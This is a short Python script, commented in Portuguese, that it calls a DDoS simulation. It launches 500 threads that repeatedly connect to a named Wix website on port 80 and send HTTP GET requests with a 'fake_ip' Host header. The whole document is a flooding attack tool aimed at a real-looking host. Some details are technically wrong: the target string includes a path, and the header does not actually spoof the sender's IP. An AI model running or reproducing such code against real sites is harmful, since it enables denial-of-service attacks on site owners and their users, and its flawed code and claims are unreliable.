import threading
import socket

# Programa que simula um DDOS

target = "daniel403.wixsite.com/website"                      # domain / alvo MEU IP
port = 80                                                     # dependendo do port acontecem diferentes coisas
fake_ip = "182.21.20.32"


def attack():
# Ciclo que repete sempre a ligação, envio, e fecho do ip do alvo
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))                                                           # liga ao alvo
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))      # liga, manda 
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))         # liga, manda  
        s.close()                                                                           # fecha


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
